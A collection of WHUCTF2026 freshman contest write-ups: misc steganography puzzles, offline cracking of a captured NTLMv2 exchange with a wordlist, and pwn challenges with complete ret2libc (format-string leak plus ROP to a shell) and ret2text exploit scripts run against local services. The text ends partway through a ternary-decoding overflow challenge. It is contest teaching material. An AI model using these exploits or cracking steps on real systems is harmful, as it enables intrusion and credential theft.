
![视频抽帧](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/video-contact-sheet.jpg)

二维码只在少数画面里闪一下。

### 拼二维码

240 帧、960×640。第 52/53/54 帧分别是二维码上中下三段（132–134、196–198 重复）。不是三张完整码，得按行从三帧取色带：29×29 模块、间距 12px，中心从 `(312,152)` 起，行到 242、398 换帧。定位图案被掏空了，但 Version 3 / Q / mask 0 还在。

![三帧色带](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/qr-source-frames.png)

按标准版式读数据区，mask 0 还原，两块 RS syndrome 全零，byte 模式解出 flag。

![重建二维码](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/qr-reconstructed.png)

### exp

依赖 numpy / Pillow / segno，以及导出 `liteav_*` 的 FFmpeg 4.3（`TXFFMPEG_LIB`）。`python solve.py receiver.mp3 output`

```python
#!/usr/bin/env python3
"""Extract the hidden MP4, rebuild its flashed QR code, and verify its RS blocks."""
import argparse
import ctypes as C
from ctypes.util import find_library
import os
import struct
from io import BytesIO
from pathlib import Path
from zipfile import ZipFile

import numpy as np
from PIL import Image
from segno import consts, encoder

FFMPEG = os.environ.get("TXFFMPEG_LIB") or find_library("TXFFmpeg")
assert FFMPEG, "set TXFFMPEG_LIB to a compatible FFmpeg library"
FRAME_IDS = (52, 53, 54)

def extract_mp4(source: Path) -> bytes:
    data = source.read_bytes()
    assert data[:3] == b"ID3" and data[10:14] == b"PRIV"
    frame_size = sum((data[i] & 0x7f) << shift for i, shift in zip(range(14, 18), (21, 14, 7, 0)))
    frame = data[20:20 + frame_size]
    owner, sep, _ = frame.partition(b"\0")
    assert sep and owner == b"archive"
    id3_size = sum((data[i] & 0x7f) << shift for i, shift in zip(range(6, 10), (21, 14, 7, 0)))
    archive_start = data.index(b"PK\x03\x04", 20)
    with ZipFile(BytesIO(data[archive_start:10 + id3_size])) as zf:
        assert zf.namelist() == ["receiver.mp4"]
        mp4 = zf.read("receiver.mp4")
    assert mp4[4:8] == b"ftyp"
    return mp4

def atom_boxes(data: bytes, start: int, end: int):
    result = []
    pos = start
    while pos + 8 <= end:
        size = struct.unpack_from(">I", data, pos)[0]
        kind, header = data[pos + 4:pos + 8], 8
        if size == 1:
            size, header = struct.unpack_from(">Q", data, pos + 8)[0], 16
        elif size == 0:
            size = end - pos
        assert size >= header and pos + size <= end, (kind, pos, size, end)
        result.append((kind, pos, pos + header, pos + size))
        pos += size
    assert pos == end
    return result

def one(boxes, kind):
    return next(box for box in boxes if box[0] == kind)

def children(data: bytes, box):
    return atom_boxes(data, box[2], box[3])

def video_sample_table(mp4: bytes):
    root = atom_boxes(mp4, 0, len(mp4))
    moov = one(root, b"moov")
    for trak in (b for b in children(mp4, moov) if b[0] == b"trak"):
        mdia = one(children(mp4, trak), b"mdia")
        mdia_boxes = children(mp4, mdia)
        hdlr = one(mdia_boxes, b"hdlr")
        if mp4[hdlr[2] + 8:hdlr[2] + 12] != b"vide":
            continue
        minf = one(mdia_boxes, b"minf")
        stbl = one(children(mp4, minf), b"stbl")
        boxes = children(mp4, stbl)
        stsd = one(boxes, b"stsd")
        entry = stsd[2] + 8
        entry_size = struct.unpack_from(">I", mp4, entry)[0]
        assert mp4[entry + 4:entry + 8] == b"avc1"
        avcc = one(atom_boxes(mp4, entry + 86, entry + entry_size), b"avcC")
        extradata = mp4[avcc[2]:avcc[3]]
        stsz = one(boxes, b"stsz")
        _, default_size, count = struct.unpack_from(">III", mp4, stsz[2])
        sizes = ([default_size] * count if default_size else
                 list(struct.unpack_from(f">{count}I", mp4, stsz[2] + 12)))
        stsc = one(boxes, b"stsc")
        nsc = struct.unpack_from(">I", mp4, stsc[2] + 4)[0]
        chunkspec = [struct.unpack_from(">III", mp4, stsc[2] + 8 + 12 * i)[0:2]
                     for i in range(nsc)]
        co = next((b for b in boxes if b[0] in (b"stco", b"co64")))
        nco = struct.unpack_from(">I", mp4, co[2] + 4)[0]
        width = 4 if co[0] == b"stco" else 8
        offsets = list(struct.unpack_from(f">{nco}{'I' if width == 4 else 'Q'}", mp4, co[2] + 8))
        sample_offsets, si = [], 0
        for chunk_no, chunk_offset in enumerate(offsets, 1):
            samples_per_chunk = max(x for x in chunkspec if x[0] <= chunk_no)[1]
            at = chunk_offset
            for _ in range(samples_per_chunk):
                sample_offsets.append(at)
                at += sizes[si]
                si += 1
        assert si == count and len(extradata) > 8
        return sample_offsets, sizes, extradata
    raise AssertionError("video track not found")

class AVCodecParameters(C.Structure):
    _fields_ = [
        ("codec_type", C.c_int), ("codec_id", C.c_int), ("codec_tag", C.c_uint),
        ("extradata", C.c_void_p), ("extradata_size", C.c_int), ("format", C.c_int),
        ("bit_rate", C.c_int64), ("bits_per_coded_sample", C.c_int),
        ("bits_per_raw_sample", C.c_int), ("profile", C.c_int), ("level", C.c_int),
        ("width", C.c_int), ("height", C.c_int),
    ]

class AVFramePrefix(C.Structure):
    _fields_ = [
        ("data", C.c_void_p * 8), ("linesize", C.c_int * 8),
        ("extended_data", C.POINTER(C.c_void_p)), ("width", C.c_int),
        ("height", C.c_int), ("nb_samples", C.c_int), ("format", C.c_int),
    ]

def decode_video(mp4: bytes, out_dir: Path):
    lib = C.CDLL(FFMPEG)
    def api(name, result, args):
        fn = getattr(lib, "liteav_" + name)
        fn.restype, fn.argtypes = result, args
        return fn
    find = api("avcodec_find_decoder_by_name", C.c_void_p, [C.c_char_p])
    alloc_ctx = api("avcodec_alloc_context3", C.c_void_p, [C.c_void_p])
    open_ctx = api("avcodec_open2", C.c_int, [C.c_void_p, C.c_void_p, C.c_void_p])
    par_alloc = api("avcodec_parameters_alloc", C.c_void_p, [])
    par_to_ctx = api("avcodec_parameters_to_context", C.c_int, [C.c_void_p, C.c_void_p])
    send = api("avcodec_send_packet", C.c_int, [C.c_void_p, C.c_void_p])
    receive = api("avcodec_receive_frame", C.c_int, [C.c_void_p, C.c_void_p])
    packet_alloc = api("av_packet_alloc", C.c_void_p, [])
    packet_from_data = api("av_packet_from_data", C.c_int, [C.c_void_p, C.c_void_p, C.c_int])
    packet_unref = api("av_packet_unref", None, [C.c_void_p])
    frame_alloc = api("av_frame_alloc", C.c_void_p, [])
    frame_unref = api("av_frame_unref", None, [C.c_void_p])
    malloc = api("av_malloc", C.c_void_p, [C.c_size_t])

    offsets, sizes, avcc = video_sample_table(mp4)
    codec = find(b"h264")
    assert codec
    ctx, params = alloc_ctx(codec), par_alloc()
    p = C.cast(params, C.POINTER(AVCodecParameters)).contents
    ext = malloc(len(avcc) + 64)
    C.memmove(ext, avcc, len(avcc)); C.memset(ext + len(avcc), 0, 64)
    p.codec_type, p.codec_id = 0, 27
    p.codec_tag = int.from_bytes(b"avc1", "little")
    p.extradata, p.extradata_size = ext, len(avcc)
    p.width, p.height = 960, 640
    assert par_to_ctx(ctx, params) == 0 and open_ctx(ctx, codec, None) == 0

    packet, frame = packet_alloc(), frame_alloc()
    wanted, decoded = {}, 0
    def drain():
        nonlocal decoded
        while True:
            status = receive(ctx, frame)
            if status < 0:
                break
            f = C.cast(frame, C.POINTER(AVFramePrefix)).contents
            assert (f.width, f.height) == (960, 640) and f.data[0]
            if decoded in FRAME_IDS:
                raw = C.string_at(f.data[0], f.linesize[0] * f.height)
                y = np.frombuffer(raw, dtype=np.uint8).reshape(f.height, f.linesize[0])[:, :f.width].copy()
                wanted[decoded] = y
            decoded += 1
            frame_unref(frame)
    for offset, size in zip(offsets, sizes):
        buf = malloc(size + 64)
        C.memmove(buf, mp4[offset:offset + size], size); C.memset(buf + size, 0, 64)
        assert packet_from_data(packet, buf, size) == 0
        assert send(ctx, packet) >= 0
        packet_unref(packet)
        drain()
    send(ctx, C.c_void_p(0))
    drain()
    assert decoded == 240 and set(wanted) == set(FRAME_IDS), (decoded, wanted.keys())
    out_dir.mkdir(parents=True, exist_ok=True)
    for i, frame_y in wanted.items():
        Image.fromarray(frame_y).save(out_dir / f"frame-{i:03}.png")
    return decoded

def decode_qr(out_dir: Path) -> str:
    frames = [np.asarray(Image.open(out_dir / f"frame-{i:03}.png").convert("L"))
              for i in FRAME_IDS]
    matrix = np.zeros((29, 29), dtype=np.uint8)
    for r in range(29):
        y = 152 + 12 * r
        image = frames[0] if y < 242 else frames[1] if y < 398 else frames[2]
        for c in range(29):
            matrix[r, c] = image[y, 312 + 12 * c] < 128

    fmt_positions = []
    for i in range(8):
        off = 1 if i >= 6 else 0
        fmt_positions.append(((i + off, 8), (8, i + off), (8, 28 - i), (28 - i, 8)))
    matches = []
    for idx, fmt in enumerate(consts.FORMAT_INFO):
        distance = 0
        for i, positions in enumerate(fmt_positions):
            v, h = (fmt >> i) & 1, (fmt >> (14 - i)) & 1
            expected = (v, h, v, 1 if i == 7 else h)  # QR's fixed dark module
            distance += sum(int(matrix[r, c]) != bit for (r, c), bit in zip(positions, expected))
        matches.append((distance, idx))
    distance, idx = min(matches)
    assert distance == 0 and idx == 24, (distance, idx)

    function = encoder.make_matrix(29, 29)
    encoder.add_finder_patterns(function, 29, 29)
    encoder.add_alignment_patterns(function, 29, 29)
    function[-8][8] = 1
    bits = []
    for right0 in range(28, 0, -2):
        right = right0 - 1 if right0 <= 6 else right0
        for vertical in range(29):
            for z in range(2):
                c = right - z
                upwards = ((right & 2) == 0) ^ (c < 6)
                r = 28 - vertical if upwards else vertical
                if function[r][c] == 2:
                    bits.append(int(matrix[r, c]) ^ int((r + c) % 2 == 0))
    assert len(bits) == 567 and bits[560:] == [0] * 7
    raw = bytes(sum(bits[i + k] << (7 - k) for k in range(8))
                for i in range(0, 560, 8))
    blocks = [bytearray(), bytearray()]
    pos = 0
    for _ in range(17):
        for block in blocks:
            block.append(raw[pos]); pos += 1
    for _ in range(18):
        for block in blocks:
            block.append(raw[pos]); pos += 1
    assert pos == 70

    def mul(a, b):
        out = 0
        while b:
            if b & 1:
                out ^= a
            a <<= 1
            if a & 0x100:
                a ^= 0x11D
            b >>= 1
        return out
    def power(a, n):
        out = 1
        for _ in range(n):
            out = mul(out, a)
        return out
    def evaluate(poly, x):
        out = 0
        for byte in poly:
            out = mul(out, x) ^ byte
        return out
    assert all(all(evaluate(block, power(2, n)) == 0 for n in range(18))
               for block in blocks)
    data = bytes(blocks[0][:17] + blocks[1][:17])
    stream = "".join(f"{byte:08b}" for byte in data)
    assert stream[:4] == "0100"
    count = int(stream[4:12], 2)
    assert count == 20
    payload = bytes(int(stream[12 + 8*i:20 + 8*i], 2) for i in range(count))
    assert stream[12 + count * 8:16 + count * 8] == "0000"
    flag = payload.decode("ascii")
    assert flag.startswith("whuctf{") and flag.endswith("}")
    return flag

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("source", type=Path, help="original receiver.mp3")
    parser.add_argument("out", type=Path, help="directory for extracted MP4 and QR frames")
    args = parser.parse_args()
    mp4 = extract_mp4(args.source)
    video_path = args.out / "receiver.mp4"
    args.out.mkdir(parents=True, exist_ok=True)
    video_path.write_bytes(mp4)
    frames = decode_video(mp4, args.out)
    flag = decode_qr(args.out)
    (args.out / "flag.txt").write_text(flag + "\n")
    print(f"mp4_bytes={len(mp4)}; decoded_frames={frames}; QR=V3-Q/mask0; RS=36/36 zero syndromes; flag={flag}")

if __name__ == "__main__":
    main()
```

### flag

```text
whuctf{h4il_t0_thee}
```



<div style="page-break-before: always;"></div>


## 凡猫修仙传

### 先看看

头像 PNG + 加密 ZIP。三层密码：PNG alpha → 地铁站名 → GIF 帧延时。

### 察毫末：alpha 通道

头像 504×515 RGBA，alpha 只有 127/255，`127` 全在最上面四行。

![头像](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/images/avatar.png)

![alpha 放大](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/images/avatar-alpha-top.png)

`255→1`、`127→0`，按行拼字节。UTF-8 解出来大意是：密码是你名字的 Base64。题面名字 `D3LM` → `RDNMTQ==`，解开第一层。

### 寻故地：站名拼音

手谕说两张照片地铁站名直接拼，示例 `循礼门中山公园` → `xunlimenzhongshangongyuan`。

![照片1](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/images/station-photo-1.png)

![换乘牌](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/images/station-photo-1-detail.png)

手提袋 `I ♥ SH`，8/9 号线换乘 → 上海陆家浜路 `lujiabanglu`。

![照片2](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/images/station-photo-2.png)

第二张单靠建筑不好认，拿加密头校验字节筛候选（高德站名拼音），唯一过三个成员的是 `lujiabanglusanyanglu`（武汉三阳路）。完整解密 CRC 也过。

### 了尘缘：GIF 延时

小故事提示“停留的片刻”。传讯符 54 帧：

![帧延时](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/images/gif-frame-delays.png)

延时当十六进制半字节连起来：

```text
key:sjekdi2939dhh5juiihhw3v
```

去掉 `key:` 就是 `HE.zip` 密码，读出 flag。

### exp

```sh
/Users/feliz/Documents/CTF/.venv/bin/python /Users/feliz/Documents/CTF/challenges/凡猫修仙传/work/solve.py
```

```python
#!/usr/bin/env python3
"""Reproduce the three archive layers from the original challenge ZIP."""
from base64 import b64encode
from io import BytesIO
from pathlib import Path
from zipfile import ZipFile
import struct
import zlib

ROOT = Path(__file__).resolve().parents[1]
SOURCE = ROOT / "original" / "00-fan_mao_xiu_xian_zhuan.zip"


def png_rgba(png: bytes):
    if png[:8] != b"\x89PNG\r\n\x1a\n":
        raise ValueError("not PNG")
    pos = 8
    compressed = bytearray()
    while pos < len(png):
        size = int.from_bytes(png[pos:pos + 4], "big")
        kind = png[pos + 4:pos + 8]
        data = png[pos + 8:pos + 8 + size]
        pos += size + 12
        if kind == b"IHDR":
            width, height, depth, color, comp, filt, interlace = struct.unpack(">IIBBBBB", data)
            if (depth, color, comp, filt, interlace) != (8, 6, 0, 0, 0):
                raise ValueError("expected non-interlaced 8-bit RGBA PNG")
        elif kind == b"IDAT":
            compressed.extend(data)
        elif kind == b"IEND":
            break
    raw = zlib.decompress(compressed)
    stride, bpp, rows, offset = width * 4, 4, [], 0
    for _ in range(height):
        ft = raw[offset]
        scan = bytearray(raw[offset + 1:offset + 1 + stride])
        offset += stride + 1
        prev = rows[-1] if rows else bytearray(stride)
        for i in range(stride):
            left = scan[i - bpp] if i >= bpp else 0
            up = prev[i]
            ul = prev[i - bpp] if i >= bpp else 0
            if ft == 1:
                scan[i] = (scan[i] + left) & 255
            elif ft == 2:
                scan[i] = (scan[i] + up) & 255
            elif ft == 3:
                scan[i] = (scan[i] + ((left + up) // 2)) & 255
            elif ft == 4:
                p = left + up - ul
                pa, pb, pc = abs(p - left), abs(p - up), abs(p - ul)
                predictor = left if pa <= pb and pa <= pc else up if pb <= pc else ul
                scan[i] = (scan[i] + predictor) & 255
            elif ft != 0:
                raise ValueError(f"unsupported PNG filter {ft}")
        rows.append(scan)
    return width, rows


def gif_delays(gif: bytes):
    if gif[:6] not in (b"GIF87a", b"GIF89a"):
        raise ValueError("not GIF")
    pos, delays = 13, []
    packed = gif[10]
    if packed & 0x80:
        pos += 3 * (1 << ((packed & 7) + 1))

    def skip_subblocks(p):
        while True:
            size = gif[p]
            p += 1
            if size == 0:
                return p
            p += size

    while pos < len(gif):
        marker = gif[pos]
        pos += 1
        if marker == 0x3B:
            break
        if marker == 0x21:
            label = gif[pos]
            pos += 1
            if label == 0xF9:
                size = gif[pos]
                if size != 4:
                    raise ValueError("bad Graphic Control Extension")
                delays.append(int.from_bytes(gif[pos + 2:pos + 4], "little"))
                pos += 1 + size + 1
            else:
                pos = skip_subblocks(pos)
        elif marker == 0x2C:
            desc = gif[pos:pos + 9]
            pos += 9
            if desc[8] & 0x80:
                pos += 3 * (1 << ((desc[8] & 7) + 1))
            pos += 1  # LZW minimum code size
            pos = skip_subblocks(pos)
        else:
            raise ValueError(f"unexpected GIF block marker {marker:#x}")
    return delays


def main():
    with ZipFile(SOURCE) as outer:
        avatar = outer.read("凡猫修仙传/哈基仙的大头照.png")
        stage1_bytes = outer.read("凡猫修仙传/神秘的文件夹.zip")

    width, rows = png_rgba(avatar)
    bits = "".join("1" if rows[y][4 * x + 3] == 255 else "0"
                   for y in range(4) for x in range(width))
    hint = bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits) - 7, 8))
    hint_text = hint.split(b"\xff", 1)[0].decode("utf-8")
    assert "base64" in hint_text and "压缩包的密码" in hint_text
    stage1_password = b64encode(b"D3LM")

    with ZipFile(BytesIO(stage1_bytes)) as stage1:
        stage3_bytes = stage1.read("神秘的文件夹/第三关.zip", pwd=stage1_password)
    location_password = b"lujiabanglusanyanglu"
    with ZipFile(BytesIO(stage3_bytes)) as stage3:
        gif = stage3.read("第三关/传讯符.gif", pwd=location_password)
        he_zip = stage3.read("第三关/HE.zip", pwd=location_password)

    delays = gif_delays(gif)
    if len(delays) != 54 or any(d > 15 for d in delays):
        raise ValueError("unexpected GIF timing payload")
    timing_text = bytes.fromhex("".join(f"{d:x}" for d in delays)).decode("ascii")
    if not timing_text.startswith("key:"):
        raise ValueError(f"unexpected timing text: {timing_text!r}")
    final_password = timing_text.split(":", 1)[1].encode("ascii")

    with ZipFile(BytesIO(he_zip)) as final_zip:
        flag = final_zip.read("HE/flag.txt", pwd=final_password)
        story = final_zip.read("HE/最终小故事.txt", pwd=final_password)
    print("alpha hint:", hint_text)
    print("stage1 password:", stage1_password.decode())
    print("location password:", location_password.decode())
    print("GIF delays:", len(delays), "timing text:", timing_text)
    print("HE.zip CRC checks: flag.txt PASS; 最终小故事.txt PASS")
    print("final story bytes:", len(story))
    print("flag:", flag.decode("utf-8"), end="")


if __name__ == "__main__":
    main()
```

### flag

```
flag{ImNotAnAI-didj5b3nshgdkwienc}
```



<div style="page-break-before: always;"></div>


## 有内鬼，终止磕盐

### 先看看

给的是 NTLMv2 的 SMB 认证流量，密码不会明文出现在包里。Wireshark 过滤 `ntlmssp`，从 challenge / auth 帧把字段抠出来，再用 rockyou 按规范重算 NTProofStr 比对。

### 抠字段

打开 `ntlmv2_133.pcapng`，显示过滤器输入 `ntlmssp`，能看到第 22–24 帧：NEGOTIATE / CHALLENGE / AUTH。

![ntlmssp 过滤](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/evidence/wireshark_step01_ntlmssp_filter.png)

第 23 帧 `NTLM Server Challenge` = `4c540eaa1c9dd478`：

![server challenge](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/evidence/wireshark_step02_server_challenge.png)

第 24 帧用户名 `backupsvc`、域 `LAB`、工作站 `WS-ACCT-07`（工作站名不进身份串）。

![auth 字段](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/evidence/wireshark_step03_ntlmv2_auth.png)

![username](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/evidence/wireshark_step04_username.png)

NTProofStr 和后面的 blob：

![ntproof](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/evidence/wireshark_step05_ntproof_blob.png)

![完整 response](/blog-assets/writeups/WHUCTF2026新生赛WP/misc/evidence/wireshark_step06_full_response.png)

字段汇总：

```text
Server Challenge = 4c540eaa1c9dd478
User             = backupsvc
Domain           = LAB
NTProofStr       = 7960d8dd8c687ac5c80bfdabd1a0f043
Blob             = 010100000000000019e9c30b8e58dc014adf77d820b346b3000000000700080019e9c30b8e58dc010900320063006900660073002f00660069006c0065007300650072007600650072002e006c00610062002e006c006f00630061006c0000000000
```

前 16 字节是 NTProofStr，后面 98 字节是 blob。

### 公式

按 [MS-NLMP 3.3.2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3)：

```text
NT hash       = MD4(UTF-16LE(password))
ResponseKeyNT = HMAC-MD5(NT hash, UTF-16LE(uppercase(username) + domain))
NTProofStr    = HMAC-MD5(ResponseKeyNT, server_challenge + blob)
```

身份串：

```python
USERNAME = "backupsvc"
DOMAIN = "LAB"
IDENTITY = (USERNAME.upper() + DOMAIN).encode("utf-16le")
```

比对函数：

```python
def matches(password: str) -> bool:
    nt_hash = MD4.new(password.encode("utf-16le")).digest()
    response_key = hmac.new(nt_hash, IDENTITY, hashlib.md5).digest()
    proof = hmac.new(response_key, SERVER_CHALLENGE + BLOB, hashlib.md5).digest()
    return hmac.compare_digest(proof, NT_PROOF)
```

MD4 用 `Crypto.Hash.MD4`（stdlib 不一定有）。字典一行行喂，命中后对密码明文算 MD5——题目要的是这个，不是 NT hash。

### exp

依赖 `pycryptodome`。跑法：

```text
/Users/feliz/Documents/CTF/.venv/bin/python '/Users/feliz/Documents/CTF/challenges/有内鬼终止盗盐/work/crack_ntlmv2.py' /private/tmp/rockyou.txt
```

完整脚本：

```python
#!/usr/bin/env python3
"""Crack the captured NTLMv2 response with a newline-delimited wordlist."""
import argparse
import hashlib
import hmac
from Crypto.Hash import MD4

USERNAME = "backupsvc"
DOMAIN = "LAB"
SERVER_CHALLENGE = bytes.fromhex("4c540eaa1c9dd478")
NT_PROOF = bytes.fromhex("7960d8dd8c687ac5c80bfdabd1a0f043")
BLOB = bytes.fromhex(
    "010100000000000019e9c30b8e58dc014adf77d820b346b3"
    "000000000700080019e9c30b8e58dc010900320063006900"
    "660073002f00660069006c00650073006500720076006500"
    "72002e006c00610062002e006c006f00630061006c0000000000"
)
IDENTITY = (USERNAME.upper() + DOMAIN).encode("utf-16le")


def matches(password: str) -> bool:
    nt_hash = MD4.new(password.encode("utf-16le")).digest()
    response_key = hmac.new(nt_hash, IDENTITY, hashlib.md5).digest()
    proof = hmac.new(response_key, SERVER_CHALLENGE + BLOB, hashlib.md5).digest()
    return hmac.compare_digest(proof, NT_PROOF)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("wordlist", help="newline-delimited password dictionary")
    args = parser.parse_args()
    tested = 0
    with open(args.wordlist, encoding="utf-8", errors="ignore") as source:
        for line_number, line in enumerate(source, 1):
            password = line.rstrip("\r\n")
            tested += 1
            if matches(password):
                digest = hashlib.md5(password.encode("utf-8")).hexdigest()
                print(f"FOUND={password}")
                print(f"LINE={line_number}")
                print(f"MD5={digest}")
                print(f"TESTED={tested}")
                return 0
    print(f"NOT_FOUND TESTED={tested}")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

输出：

```
FOUND=THUGSHIT
LINE=10564727
MD5=dcfca1c73686f0200caa6589a022224c
```

### flag

```text
flag{dcfca1c73686f0200caa6589a022224c}
```



<div style="page-break-before: always;"></div>


## nc签到

### 先看看

pwn 签到。

### 连上

```bash
nc 127.0.0.1 65091
```

回：

```text
There is nothing to exploit here.
Connecting is already the whole challenge :)

[*] Go and cat your first flag:
```

提示都说了 `cat`，那就：

```bash
cat flag
```

```txt
flag{7438fd03-78f0-82bb-8419-b817b223ca3c}
```

### flag

```
flag{7438fd03-78f0-82bb-8419-b817b223ca3c}
```



<div style="page-break-before: always;"></div>


## ret2libc

### 先看看

x86-64 ELF + 配套 libc。NX、canary、无 PIE、Partial RELRO。`vuln` 先把输入当格式串 `printf`，再用 `read` 读 `0x200`——格式串泄漏 + ret2libc。

### 泄漏

缓冲区 `[rbp-0x110]`，canary 在 `[rbp-8]`。`fgets` 之后 `printf(buf)`，再用 `%n$p` 读栈。第 6 个参数对缓冲区开头，canary 在第 39，libc 返回地址在第 43。发 `%39$p|%43$p`：

```asm
sub rsp, 0x110
lea rax, [rbp-0x110]
mov esi, 0x100
call fgets
lea rax, [rbp-0x110]
mov rdi, rax
call printf
lea rax, [rbp-0x110]
mov edx, 0x200
mov rsi, rax
mov edi, 0
call read
```

例：

```text
0xea00af20a4273500|0x7fbf3d7d61ca
```

`__libc_start_call_main` 里 `call rax` 返回点相对偏移 `0x2a1ca`：

```text
libc_base = 0x7fbf3d7d61ca - 0x2a1ca = 0x7fbf3d7ac000
```

### ROP

libc 里用到的 gadget：

| 目标 | 偏移 |
| --- | ---: |
| `ret` | `0x28a92` |
| `pop rdi; ret` | `0x10c08d` |
| `"/bin/sh"` | `0x1cc42f` |
| `system` | `0x58750` |

布局：

```text
0x108 字节填充 | 8 字节 canary | 8 字节保存的 rbp | ret | pop rdi; ret | "/bin/sh" | system
```

等 `Bye!` 再发 `cat flag; exit`，别跟溢出 `read` 搅一块。

一次跑出来：

```text
flag{b39181ce-632e-5153-c678-2a93fe3abfe5}
```

### exp

```python
#!/usr/bin/env python3
import re
import socket
import struct
import sys
import time

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 60257
p64 = lambda value: struct.pack("<Q", value)

def recvuntil(sock, marker):
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError(bytes(data))
        data.extend(chunk)
    return bytes(data)

sock = None
for _ in range(20):
    try:
        candidate = socket.create_connection((HOST, PORT), timeout=2)
        candidate.settimeout(2)
        recvuntil(candidate, b"Name: ")
        sock = candidate
        break
    except (OSError, EOFError):
        try:
            candidate.close()
        except (NameError, OSError):
            pass
        time.sleep(0.15)
if sock is None:
    raise SystemExit("service prompt unavailable")

sock.sendall(b"%39$p|%43$p\n")
leak_output = recvuntil(sock, b"Overflow: ")
match = re.search(rb"(0x[0-9a-f]+)\|(0x[0-9a-f]+)", leak_output)
if not match:
    raise SystemExit(f"leak parse failed: {leak_output!r}")
canary, libc_return = (int(value, 16) for value in match.groups())
libc_base = libc_return - 0x2A1CA
if libc_base & 0xFFF:
    raise SystemExit(f"unaligned libc base: {libc_base:#x}")

# libc.so.6: ret=0x28a92, pop rdi; ret=0x10c08d,
# "/bin/sh"=0x1cc42f, system=0x58750.
payload = (
    b"A" * 0x108
    + p64(canary)
    + b"B" * 8
    + p64(libc_base + 0x28A92)
    + p64(libc_base + 0x10C08D)
    + p64(libc_base + 0x1CC42F)
    + p64(libc_base + 0x58750)
)
sock.sendall(payload)
recvuntil(sock, b"Bye!\n")
sock.sendall(b"cat flag; exit\n")
output = bytearray()
sock.settimeout(4)
while True:
    try:
        chunk = sock.recv(4096)
        if not chunk:
            break
        output.extend(chunk)
    except socket.timeout:
        break
sock.close()
if not re.fullmatch(rb"(?:WHUCTF|whuctf|flag)\{[^\r\n]+\}\r?\n", output):
    raise SystemExit(f"unexpected shell output: {bytes(output)!r}")
sys.stdout.buffer.write(output)
```

### flag

```text
flag{b39181ce-632e-5153-c678-2a93fe3abfe5}
```



<div style="page-break-before: always;"></div>


## ret2text

### 先看看

带符号的 x86-64 ELF，有现成的 `win`（直接 `/bin/sh`），溢出改返回地址就行。

```text
$ file work/extracted/ret2text
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, with debug_info, not stripped
```

```text
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
Debuginfo:  Yes
```

无 PIE、无 canary，`win` 地址固定。

### 溢出点

```asm
4012ff: push rbp
401300: mov  rbp, rsp
401303: sub  rsp, 0x40
...
40132c: lea  rax, [rbp - 0x40]
401330: mov  esi, 0x100
401335: mov  rdi, rax
401338: call fgets@plt
...
40135e: leave
40135f: ret
```

缓冲区只有 `0x40`，`fgets` 却读到 `0xff`。前面的 `printf("Hello, %.32s")` 不当格式串，不影响覆盖。

偏移：

```text
0x40 + 8 = 0x48 = 72 字节
```

符号：

```text
00000000004012cf T win
00000000004012ff T vuln
0000000000401360 T main
```

payload：

```python
payload = b"A" * 72 + struct.pack("<Q", 0x4012CF) + b"\n"
```

### 交互

```text
What's your name? Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Goodbye!
[+] Nice! You have hijacked the return address.
[+] Enjoy your shell.
flag{199181ce-352e-5153-d578-2a939e3abfe5}
```

### exp

```python
#!/usr/bin/env python3
"""Exploit the supplied ret2text service through a local TCP port."""
import argparse
import socket
import struct
import sys
import time

p = argparse.ArgumentParser()
p.add_argument("port", type=int, help="local TCP port")
args = p.parse_args()

for attempt in range(1, 4):
    with socket.create_connection(("127.0.0.1", args.port), timeout=8) as s:
        s.settimeout(0.6)
        output = bytearray()
        try:
            while b"What's your name? " not in output:
                chunk = s.recv(4096)
                if not chunk:
                    break
                output.extend(chunk)
        except socket.timeout:
            pass
        if b"What's your name? " not in output:
            continue
        s.sendall(b"A" * 72 + struct.pack("<Q", 0x4012CF) + b"\n")
        time.sleep(0.25)
        s.sendall(b"cat flag; exit\n")
        s.settimeout(3)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                output.extend(chunk)
        except socket.timeout:
            pass
        if b"flag{" in output:
            sys.stdout.buffer.write(output)
            sys.exit(0)
sys.exit("service prompt or flag response not received")
```

### flag

```text
flag{199181ce-352e-5153-d578-2a939e3abfe5}
```



<div style="page-break-before: always;"></div>


## 你想何出怎样的意味

### 先看看

带符号 ELF。`h/y/w` 当三进制 `0/1/2`，整行解码成大端字节。无 PIE、无 canary，有 `win` @ `0x4012ff`。

### 输入路径

```asm
401539: mov    esi, 0x800       ; fgets 的长度参数
40153e: mov    edi, 0x4040c0    ; 输入缓冲区
401543: call   fgets@plt
...
40154d: mov    edx, 0x400       ; 解码输出上限
401552: mov    esi, 0x4048c0    ; 解码结果缓冲区
401557: mov    edi, 0x4040c0    ; 三进制文本
40155c: call   ternary_decode
...
40157b: mov    rdx, [rbp-0x8]   ; 解码后的长度
40157f: lea    rax, [rbp-0x50]  ; 栈上目标缓冲区
401588: mov    rdi, rax
40158b: call   memcpy@plt
```

`fgets` 最多 2047 字符，解码最多出 1024 字节，但 `memcpy` 目标只有 `0x50`——长度没截断，直接溢出。

解码就是反复：

```text
value = value * 3 + digit
```

中间值放小端数组，最后逆序成大端。比如 `wyhw` → `0x41`（`A`）。

### 偏移

```asm
4014d7: push   rbp
4014d8: mov    rbp, rsp
4014db: sub    rsp, 0x50
```

